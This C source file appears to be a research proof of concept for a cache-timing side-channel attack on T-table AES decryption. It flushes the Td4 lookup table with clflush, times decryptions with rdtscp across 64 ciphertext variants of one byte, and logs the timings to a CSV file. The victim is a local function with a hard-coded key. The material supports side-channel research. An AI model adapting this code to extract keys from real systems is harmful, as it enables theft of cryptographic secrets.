#include "../../aes_source/attack.h"
#include <time.h>

#include <mastik/low.h>
#include <mastik/util.h>


extern u8 Td4[256];
#define SAMPLES 200 //0 //0
#define REPEAT 1
#define memory_barrier asm volatile ("sfence;\nmfence;\nlfence;\n");

int flush_array[256 * 1024] = {0};
int time_collection[SAMPLES] = {0};

void init_array(int *buffer);
void victim_function(aes_t pt, aes_t ct, AES_KEY aeskey, int index);

int main(int argc, char* argv[])
{
  /* We always check the first byte accuracy */
  int check_byte = 0;

  aes_t key, pt, ct, pt_candidate, key_backup, real_key;
  int highest_timing = 0;
  toBinary("00112233445566778899aabbccddeeff", key);
  AES_set_decrypt_key(key, 128, &aeskey);
  const u32 *rk;
  rk = aeskey.rd_key;

  // We need a ciphertext that does not access the evicted cache line in first two rounds. 
  // Since we only aim to test if E+S+T works here, we assume we have a qualified ciphertext.
  toBinary("68aa68034fdde47a398c8a941ce8f9de", pt_candidate);

  for (int copy_key = 0; copy_key < 16; copy_key++) {
    real_key[copy_key] = (rk[copy_key/4] >> ((copy_key % 4) * 8)) & 0xff;
  }
  printf("Real key: %d\n", real_key[check_byte]);

  // Get first round key
  aes_t key_r0;
  for (int i = 0; i < 16; i++) 
    key_r0[i] = (rk[i/4] >> ((i % 4) * 8)) & 0xff;
  
  // Initialize the array
  init_array(flush_array);

  
  // Warmup
  for (int rr = 0; rr < 100; rr++)
    delayloop(0x800000);

  // We now just measure one byte
  for (int bytes = check_byte; bytes < (check_byte + 1); bytes++) {
    aes_t pt_collection2[64] = {0};
    uint32_t time_collection2[64] = {0};

    // Get modified ciphertext
    for (int i = 0; i < 64; i++) {
      toBinary(toString(pt_candidate), pt);

      for (int j = 0; j < 16; j++)
        pt_collection2[i][j] = pt[j];
      pt_collection2[i][bytes] = (pt[bytes] & (~0x3F)) | i;
    }

    // Warmup
    for (int rr = 0; rr < 20; rr++)
      delayloop(0x800000);

    for (int i = 0; i < 64; i++) {
      uint64_t overall = 0;
      for (int repeat = 0; repeat < REPEAT; repeat ++) {
        int index = random() & 0xFF;


        *(volatile uint8_t*)&Td4[64];
        *(volatile uint8_t*)&Td4[128];
        *(volatile uint8_t*)&Td4[192];
        memory_barrier
        memory_barrier
        memory_barrier
        clflush(&Td4[0]);
        memory_barrier
        memory_barrier
        memory_barrier

        clflush(&flush_array[flush_array[index << 10] << 10]);
        clflush(&flush_array[index << 10]);
        memory_barrier

        uint32_t timing = rdtscp();
        victim_function(pt_collection2[i], ct, aeskey, index); // Do AES decryption
        timing = rdtscp() - timing;
        memory_barrier
        overall += timing;
      }
      time_collection2[i] = overall / REPEAT;
      
    }

    FILE *f = fopen("data1.csv", "w");
    fprintf(f, "ciphertext time\n");
    for (int i = 0; i < 64; i++)
      fprintf(f, "%s %d\n", toString(pt_collection2[i]), time_collection2[i]);
    fclose(f);
  }
}

void init_array(int *buffer)
{
    for (size_t k = 0; k < 256; ++k)
    {                                                                  
        size_t x = ((k * 167) + 13) & (0xff);
        buffer[k * 1024] = x;
    }
}

void victim_function(aes_t pt, aes_t ct, AES_KEY aeskey, int index)
{
  memory_barrier
  volatile int next_index = flush_array[index << 10];
  asm volatile (".rept 100;\nNOP;\n.endr");
  next_index = flush_array[next_index << 10];
  asm volatile (".rept 100;\nNOP;\n.endr");
  AES_decrypt(pt, ct, &aeskey);
  memory_barrier
}